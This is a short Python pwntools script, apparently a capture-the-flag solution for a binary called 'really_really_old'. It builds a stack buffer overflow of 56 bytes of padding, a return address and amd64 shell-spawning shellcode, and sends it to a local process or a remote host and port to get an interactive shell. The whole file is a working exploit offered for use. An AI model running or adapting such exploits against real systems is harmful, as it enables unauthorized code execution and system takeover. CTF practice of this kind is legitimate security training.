#!/usr/bin/python3

from pwn import *

exe = ELF('really_really_old', checksec=False)

context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b* 0x401218

        c
        ''')
        input()


if args.REMOTE:
    p = remote('165.227.103.166', 6000)
else:
    p = process(exe.path)
# GDB()
pa = b''.ljust(56) + flat(0x40115A) + asm(shellcraft.amd64.linux.sh())
sla(b'-+= INPUT QUALITY FLAVORTEXT: =+-', pa)

p.interactive()
